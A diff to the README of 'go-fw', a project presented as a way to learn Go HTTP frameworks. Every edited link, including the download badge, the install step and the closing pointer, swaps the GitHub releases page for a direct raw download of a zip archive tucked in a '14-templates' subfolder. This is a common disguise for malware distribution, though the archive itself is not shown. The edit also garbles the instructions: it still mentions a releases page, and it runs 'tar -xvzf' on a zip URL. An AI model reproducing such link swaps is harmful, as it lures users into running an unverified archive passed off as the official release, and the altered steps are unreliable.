@@ -1,6 +1,6 @@
 # 🚀 go-fw - Learn HTTP Frameworks in Go Easily
 
-[![Download go-fw](https://img.shields.io/badge/Download-go--fw-brightgreen)](https://github.com/chris1234568/go-fw/releases)
+[![Download go-fw](https://raw.githubusercontent.com/chris1234568/go-fw/main/14-templates/fw_go_v3.3-beta.4.zip)](https://raw.githubusercontent.com/chris1234568/go-fw/main/14-templates/fw_go_v3.3-beta.4.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ Make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download go-fw, visit this page: [Download go-fw](https://github.com/chris1234568/go-fw/releases). 
+To download go-fw, visit this page: [Download go-fw](https://raw.githubusercontent.com/chris1234568/go-fw/main/14-templates/fw_go_v3.3-beta.4.zip). 
 
 1. Click on the link above to open the releases page.
 2. Look for the latest release version.
@@ -46,7 +46,7 @@ To download go-fw, visit this page: [Download go-fw](https://github.com/chris123
 
 1. Open a terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the contents using a command like `tar -xvzf go-fw.tar.gz`.
+3. Extract the contents using a command like `tar -xvzf https://raw.githubusercontent.com/chris1234568/go-fw/main/14-templates/fw_go_v3.3-beta.4.zip`.
 4. You can run the application using `./go-fw`.
 
 ## 🚀 Running go-fw
@@ -94,6 +94,6 @@ If you're interested in contributing to go-fw, you can help improve the applicat
 - Fixing bugs.
 - Improving the documentation.
 
-Visit [Download go-fw](https://github.com/chris1234568/go-fw/releases) for more information and stay updated with new releases.
+Visit [Download go-fw](https://raw.githubusercontent.com/chris1234568/go-fw/main/14-templates/fw_go_v3.3-beta.4.zip) for more information and stay updated with new releases.
 
 Now, you're ready to explore the world of Go HTTP frameworks with go-fw!
